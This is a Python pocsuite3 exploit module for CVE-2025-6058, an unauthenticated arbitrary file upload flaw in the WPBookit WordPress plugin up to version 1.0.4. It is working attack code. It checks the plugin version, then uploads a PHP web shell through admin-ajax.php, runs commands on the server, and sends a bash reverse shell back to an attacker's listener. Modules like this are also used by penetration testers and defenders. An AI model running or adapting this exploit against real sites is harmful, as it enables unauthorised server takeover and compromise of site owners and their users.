from pocsuite3.api import POCBase, register_poc, requests, logger, get_listener_ip, get_listener_port, OrderedDict, OptString, REVERSE_PAYLOAD
from pocsuite3.api import Output, POC_CATEGORY, VUL_TYPE
import re
import time
from datetime import datetime
import os
import urllib.parse

class CVE20256058POC(POCBase):
    vulID = 'CVE-2025-6058'
    version = '1.0'
    author = ['Pocsuite3']
    vulDate = '2025-07-11'
    createDate = '2025-07-15'
    updateDate = '2025-07-15'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-6058']
    name = 'WPBookit <= 1.0.4 Unauthenticated Arbitrary File Upload CVe-2025-6058'
    appPowerLink = 'https://wordpress.org/plugins/wpbookit/'
    appName = 'WPBookit'
    appVersion = '<= 1.0.4'
    vulType = VUL_TYPE.UPLOAD_FILES
    desc = '''
        WPBookit plugin version <= 1.0.4 for WordPress is vulnerable to unauthenticated arbitrary file upload
        via the admin-ajax.php endpoint, allowing attackers to upload malicious PHP files.
    '''
    samples = []
    install_requires = []
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('id', description='Command to execute')
        return o

    def _verify(self):
        result = {}
        session = requests.Session()
        session.verify = False
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
        }
        url = self.url.rstrip('/')
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url

        try:
            readme_url = f"{url}/wp-content/plugins/wpbookit/README.txt"
            resp = session.get(readme_url, headers=headers, timeout=10)
            if resp.status_code != 200:
                return self.parse_output(result)

            match = re.search(r"Stable tag:\s*([0-9.]+)", resp.text)
            if not match:
                return self.parse_output(result)

            version = match.group(1).strip()
            if self.is_vulnerable_version(version, "1.0.4"):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Version'] = version
                result['VerifyInfo']['Message'] = 'Target is vulnerable'
        except Exception as e:
            e

        return self.parse_output(result)

    def _attack(self):
        result = {}
        session = requests.Session()
        session.verify = False
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
            "Accept": "*/*"
        }
        url = self.url.rstrip('/')
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url

        cmd = self.get_option("cmd") or "whoami"

        try:
            ajax_url = f"{url}/wp-admin/admin-ajax.php"
            shell_file = self.make_shell()

            with open(shell_file, 'rb') as f:
                files = {
                    'cover_image_img': (shell_file, f, 'application/octet-stream')
                }
                data = {
                    'action': 'wpb_ajax_post',
                    'route_name': 'add_booking_type',
                    'title': 'TestExploit',
                    'booking_type': 'Exploited'
                }

                upload_resp = session.post(ajax_url, headers=headers, files=files, data=data, timeout=15)
                if upload_resp.status_code != 200 or "success" not in upload_resp.text.lower():
                    os.remove(shell_file)
                    return self.parse_output(result)

            now = datetime.now()
            year, month = now.year, now.strftime('%m')
            possible_shell_paths = [
                f"/wp-content/uploads/{year}/{month}/shell.php",
                f"/wp-content/uploads/shell.php",
                f"/wp-content/uploads/bookit/shell.php"
            ]

            for shell_path in possible_shell_paths:
                check_url = f"{url}{shell_path}?cmd={urllib.parse.quote(cmd)}"
                check_resp = session.get(check_url, headers=headers, timeout=10)

                if check_resp.status_code == 200 and check_resp.text.strip():
                    result['ExploitInfo'] = {
                        'URL': url,
                        'ShellPath': shell_path,
                        'Command': cmd,
                        'Output': check_resp.text.strip()
                    }
                    break

            os.remove(shell_file)

        except Exception as e:
            e
        return self.parse_output(result)

    def is_vulnerable_version(self, found_version, max_vulnerable="1.0.4"):
        try:
            return tuple(int(part) for part in found_version.split('.')) <= tuple(int(part) for part in max_vulnerable.split('.'))
        except Exception:
            return False

    def make_shell(self):
        shell = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>'
        shell_name = "shell.php"
        with open(shell_name, "w") as f:
            f.write(shell)
        return shell_name

    def _shell(self):
        result = {}
        now = datetime.now()
        year, month = now.year, now.strftime('%m')
        url = self.url.rstrip('/')
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url

        possible_shell_paths = [
            f"/wp-content/uploads/{year}/{month}/shell.php"
        ]

        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        encoded_payload = urllib.parse.quote(cmd)

        for shell_path in possible_shell_paths:
            try:
                web_shell_url = f"{url}{shell_path}"
                rce_url = f"{web_shell_url}?cmd={encoded_payload}"
                response = requests.get(rce_url, verify=False, timeout=20)

                if response.status_code == 200:
                    result['ShellInfo'] = {
                        'Web_Shell_URL': web_shell_url,
                        'Status': 'Reverse shell executed successfully',
                        'Listener': f"{get_listener_ip()}:{get_listener_port()}"
                    }
                    break
            except requests.exceptions.RequestException as e:
                logger.error(f"[!] Reverse shell execution failed : {str(e)}")

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(CVE20256058POC)
